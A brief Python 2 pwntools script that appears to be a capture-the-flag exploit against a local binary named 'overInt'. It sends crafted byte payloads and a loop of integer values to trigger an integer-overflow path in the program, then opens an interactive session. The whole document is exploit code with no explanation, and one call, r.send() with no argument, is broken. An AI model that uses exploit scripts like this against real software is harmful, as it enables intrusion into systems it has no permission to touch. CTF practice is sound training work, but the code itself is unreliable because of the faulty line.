from pwn import *
context.log_level = "debug"
r = process("overInt")
print r.pid
pause()
payload = chr(6)+chr(78)+chr(17)+chr(115)
payload += chr(5)+chr(0)+chr(0)+chr(0)
payload += chr(0)*16+chr(0x72)+chr(0x33)+chr(0x63)+chr(0x20)
r.send(payload)
payload = chr(100)+chr(0)+chr(0)+chr(0)
r.send(payload)

for  i in range(0,100):
    payload = chr(i)+chr(0)+chr(0)+chr(0)
    r.send(payload)
    if (i<48):
      r.send()
       
  
r.interactive()
